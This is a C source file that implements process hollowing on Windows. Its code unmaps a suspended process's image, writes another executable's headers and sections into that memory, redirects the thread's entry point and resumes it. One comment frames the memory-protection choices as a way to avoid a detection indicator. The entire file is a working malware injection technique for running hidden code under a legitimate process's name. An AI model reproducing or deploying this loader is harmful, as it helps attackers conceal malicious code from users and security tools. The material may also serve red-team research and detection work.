#include "pe.h"
#include "process.h"
#include "processhollowing.h"
#include "utils.h"

INT ProcessMapExe(HANDLE hProcess, LPCBYTE lpBytes, LPVOID lpBaseAddress) {
	// Get pointer to PE headers.
	PIMAGE_NT_HEADERS pinh = PeGetNtHeaders(lpBytes);

	// To map the executable file into memory, we must allocate memory for the entire PE file.
	// Once the memory section has been mapped, we can write the relevant file's section in.
	// This must be done for all sections of the PE file.
	// When all sections have been written, we should fix each section's permissions. Using RWX is a detection indicator!

	// Unused.
	DWORD flOldProtect = 0;

	// Let's write the header first. Since this is one-to-one on disk and in memory, we can directly write it in.
	LPVOID lpAddress = VirtualAllocEx(hProcess, (LPVOID)lpBaseAddress, pinh->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpAddress == NULL) {
		// Failed to allocate memory! Error.
		return -1;
	}
	// Write the header.
	WriteProcessMemory(hProcess, lpAddress, lpBytes, pinh->OptionalHeader.SizeOfHeaders, NULL);
	// Reprotect the section with appropriate protections.
	if (VirtualProtectEx(hProcess, (LPVOID)lpBaseAddress, (SIZE_T)pinh->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &flOldProtect) == FALSE) {
		// Warning!
		//return -1;
	}

	// Now let's do each section. Each section must be mapped to its correct page-aligned section, i.e. not one-to-one like the headers.
	for (WORD i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		// Get a pointer to the ith section header.
		PIMAGE_SECTION_HEADER pish = PeGetSectionHeaderByIndex(lpBytes, i);
		// Write the section.
		WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)lpAddress + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)lpBytes + pish->PointerToRawData), (SIZE_T)pish->SizeOfRawData, NULL);
		// Get the appropriate memory protection from the section's characteristics.
		// LdrpSetProtection https://doxygen.reactos.org/dd/d83/ntdllp_8h.html#a88a1b8b80be9a434625d6ccbaba899fb
		DWORD flProtect = 0;
		if (pish->SizeOfRawData && !(pish->Characteristics & IMAGE_SCN_MEM_WRITE)) {
			if (pish->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
				flProtect = PAGE_EXECUTE_READ;
			} else {
				flProtect = PAGE_READONLY;
			}
			
			if (pish->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
				flProtect |= PAGE_NOCACHE;
			}

			// Reprotect the section with the appropriate protections.
			// Should we just set all pages initially with RWX and just warn on this fail?
			if (VirtualProtectEx(hProcess, (LPVOID)((DWORD_PTR)lpAddress + (DWORD_PTR)pish->VirtualAddress), (SIZE_T)pish->Misc.VirtualSize, flProtect, &flOldProtect) == FALSE) {
				return -1;
			}
		}
	}

	return 0;
}

INT ProcessHollowFromMemory(CONST HANDLE hProcess, CONST HANDLE hThread, LPCBYTE lpBytes) {
	if (PeVerifyExeHeaders(lpBytes) == FALSE) {
		// Not an executable file.
		SetLastError(ERROR_BAD_EXE_FORMAT);
		return -1;
	}

	// Get thread context of process to modify address of entry point.
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);

	// Get the base address of the target process so we can unmap it.
	PVOID pBaseAddr = ProcessGetBaseAddress(hProcess);
	if (pBaseAddr == 0) {
		// Failed to get base address.
		return -1;
	}

	// Unmap the executable image's section in case our desired process's image clashes with it.
	NTSTATUS(NTAPI *fpNtUnmapViewOfSection)(HANDLE, PVOID)
		= (NTSTATUS(NTAPI *)(HANDLE, PVOID))
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");
	if (fpNtUnmapViewOfSection == NULL) {
		return -1;
	}

	if (!NT_SUCCESS(fpNtUnmapViewOfSection(hProcess, pBaseAddr))) {
		// Could not unmap target process's executable image.
		return -1;
	}

	// Map the executable file's bytes into the process space.
	if (ProcessMapExe(hProcess, lpBytes, pBaseAddr) == -1) {
		// Error.
		return -1;
	}

	// Change the address of entry point to the new process's.
	ctx.Eax = PeGetAddressOfEntryPoint(lpBytes);
	// Set the context to the main thread.
	SetThreadContext(hThread, &ctx);

	// Release the thread from suspended state and start executing.
	// IGOR, IT'S ALIVE!!!
	ResumeThread(hThread);

	return 0;
}

INT ProcessHollowFromFile(CONST HANDLE hProcess, CONST HANDLE hThread, LPCWSTR lpFileName) {
	HANDLE hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	// Assuming file does not exceed max DWORD value.
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return -1;
	}

	LPBYTE lpFileData = _HeapAlloc(HEAP_ZERO_MEMORY, dwFileSize);
	if (lpFileData == NULL) {
		CloseHandle(hFile);
		return -1;
	}

	// Read file contents into buffer.
	DWORD dwRead = 0;
	if (ReadFile(hFile, lpFileData, dwFileSize, &dwRead, NULL) == FALSE) {
		_HeapFree(lpFileData);
		CloseHandle(hFile);
		return -1;
	}

	ProcessHollowFromMemory(hProcess, hThread, lpFileData);

	_HeapFree(lpFileData);
	CloseHandle(hFile);

	return 0;
}